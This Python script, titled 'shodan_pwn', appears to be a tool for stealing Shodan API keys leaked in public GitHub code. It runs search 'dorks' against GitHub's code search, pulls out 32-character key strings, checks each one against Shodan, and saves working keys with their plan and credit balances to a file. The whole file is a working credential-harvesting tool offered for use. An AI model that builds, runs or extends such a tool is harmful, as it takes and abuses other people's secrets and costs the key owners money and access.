import os
import sys
import time
import datetime

try:
    from shodan import Shodan
except ImportError:
    print ('\033[91m[-] you need to install the shodan module\033[0m')
    os.system("pip3 install shodan")

try:
    from github import Github
except ImportError:
    print ('\033[91m[-] you need to install the github module\033[0m')
    os.system("pip3 install pygithub")

box = '''\033[91m
                          ┌─┐┬ ┬┌─┐┌┬┐┌─┐┌┐┌   ┌─┐┬ ┬┌┐┌
                          └─┐├─┤│ │ ││├─┤│││   ├─┘││││││
                          └─┘┴ ┴└─┘─┴┘┴ ┴┘└┘───┴  └┴┘┘└┘    
               ┌──────────────────────────────────────────────────┐ 
       ┌───────┤                \033[95mCredits: \033[94mgithub/9xN\033[91m               ├───────┐
       │       └──────────────────────────────────────────────────┘       │
       │ \033[93m$ \033[38;5;147mpython3 shodan_pwn.py <github-api-token> <keys.out> \033[92mor\033[38;5;147m prompts\033[91m │
       └──────────────────────────────────────────────────────────────────┘
\033[0m
'''

def readenv():
    try:
        env_vars = {}

        with open('.env', "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#") and "=" in line:
                    key, value = line.split("=")
                    env_vars[key] = value.strip()
        return list(env_vars.values())
    except FileNotFoundError:
        print(".env file not found")
        return False
        
def writeenv(github_api_key, path_to_keys_file):
    keys = ['GITHUB_API_KEY', 'PATH_TO_KEYS_FILE']
    values = [github_api_key, path_to_keys_file]

    with open('.env', 'w') as env_file:
        for i in range(len(keys)):
            env_file.write(f'{keys[i]}={values[i]}\n')

def cfile(file_name):
    with open(file_name, "w") as file:
        file.write("")

def clean(shodan_path):
    lines = []
    keyList = []

    with open(shodan_path, 'r+') as f:
        for line in f.readlines():
            if line.split(" ")[0] not in keyList:
                lines.append(line)
                keyList.append(line.split(" ")[0])

    with open(shodan_path, 'w') as f:
        for line in lines:
            f.write(line)


def check(key, shodan_path):
    try:
        shodan_api = Shodan(key)
        if shodan_api.info()['query_credits'] >= 50:
            print("Key Found!")
            with open(shodan_path, 'a+') as f:
                f.write(key + " Plan: " + str(shodan_api.info()['plan']) + " Credits: " + str(shodan_api.info()['query_credits']) + " Scans: " + str(shodan_api.info()['scan_credits']) + " HTTPS: " + str(shodan_api.info()['https']) + " Telnet: " + str(shodan_api.info()['telnet']) + "\n")
    except:
        pass
 
def search(token, shodan_path, keyword, language):
    while True:
        try:
            api = Github(token)
            api.per_page = 1
            repos = api.search_code(language + keyword)
            tc = repos.totalCount
        except Exception as e:
            if "rate limit" in str(e):
                time.sleep(30)
                continue
        break

    for i in range(0, tc):
        while True:
            try:
                lines = str(repos.get_page(i)[0].decoded_content, 'utf-8').split("\n")

                for line in lines:
                    original = line
                    line = line.strip().lower().replace(' ', '')

                    if keyword + '"' in line:
                        split = original.split('"')
                        if len(split[1]) == 32:
                            check(split[1], shodan_path)
                    elif keyword + "'" in line:
                        split = original.split("'")
                        if len(split[1]) == 32:
                            check(split[1], shodan_path)

            except Exception as e:
                if "rate limit" in str(e):
                    time.sleep(30)
                    continue
            break

def handler(gittoken, outkey):
    keywordFiles = os.listdir("dorks/")
    language = None

    for keywordFile in keywordFiles:
        if "python" in keywordFile:
            language = "language:python "
        elif "js" in keywordFile:
            language = "language:javascript "
        elif "go" in keywordFile:
            language = "language:go "
        elif "java" in keywordFile:
            language = "language:java "
        elif "c" in keywordFile:
            language = "language:c "
        else:
            continue
        keywordList = []
        with open("dorks/" + keywordFile, 'r') as f:
            if f.readable() and not f.read().strip():
                continue
            f.seek(0)
            for l in f.readlines():
                keywordList.append(l.strip())

        try:
            for keyword in keywordList:
                dt = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")
                print("\033[38;5;41m[\033[38;5;45m" + dt + "\033[38;5;41m]" + " \033[38;5;219m- \033[38;5;93mSearching with query \033[38;5;219m~> \033[38;5;41m'\033[38;5;226m" + language + keyword + "\033[38;5;41m'\033[0m")
                search(gittoken, outkey, keyword, language)

            clean(outkey)

        except Exception as e:
            print("\n\033[91mError: " + str(e) + "\033[0m\n")
            exit()

try:
    if os.name == "nt": os.system("cls")
    else: os.system("clear")
    ascii_art = '''\033[32m\n                       Started!
                        _______________
    (my eye) -> (0) ==c(___(o(______(_()   (api keys on github)
                            \=\\
                             )=\\
                            //|\\\\
                           //|| \\\\  <- (telescope)
                          // ||  \\\\
                         //  ||   \\\\
                        //         \\\\
\033[0m'''
    if len(sys.argv) != 3:
        creds = readenv()
        print(box)
        if creds[0] == '' or creds[1] == '':
            gitkey = input("\033[38;5;128m[\033[38;5;40m+\033[38;5;128m]\033[38;5;111m Enter your github api key \033[38;5;219m~>\033[38;5;111m ")
            keyout = input("\033[38;5;128m[\033[38;5;40m+\033[38;5;128m]\033[38;5;111m Enter your output file that you would like to store found keys in \033[38;5;219m~>\033[38;5;111m ")
            cfile(keyout)
            writeenv(gitkey, keyout)
            print(ascii_art)
            handler(gitkey, keyout)
        else: 
            print(ascii_art)
            cfile(creds[1])
            handler(creds[0], creds[1])
    else:
        gitkey = sys.argv[1]
        keyout = sys.argv[2]
        cfile(keyout)
        print(ascii_art)
        handler(gitkey, keyout)
except KeyboardInterrupt:
    exit()
